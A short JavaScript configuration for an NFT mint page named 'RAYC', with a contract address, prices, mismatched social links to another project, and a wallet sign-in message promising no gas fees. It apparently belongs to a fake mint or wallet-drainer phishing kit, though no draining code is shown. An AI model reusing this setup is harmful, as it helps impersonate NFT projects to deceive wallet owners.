const collectionInfo = {
	address: "0x88cAB4C052E64078fAD14448DDD666B4a3d7F8Ad",
    name: "RAYC",
    socialMedia: {
        discord: "https://discord.com/invite/karafuru",
        twitter: "https://twitter.com/KarafuruNFT",
        instagram: "",
    },
    eprice: 0,
    nprice: 0.01,
    nfts:  100,
    spots: 89,
    logo: "images/bg.jpg",
    backgroundImage: "https://www.rareapepeyachtclub.com/assets/bar-out.965ab2cb.jpeg",
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

if (!collectionInfo.address.startsWith("0x") || (collectionInfo.address.length >= 64 || collectionInfo.address.length <= 40))
    console.error(`Error: ${collectionInfo.address} is not a valid Ethereum address.`);

document.getElementById("favicon").href = collectionInfo.logo;
document.getElementById('backgroundImage').style['backgroundImage'] = "url('"+collectionInfo.backgroundImage+"')";
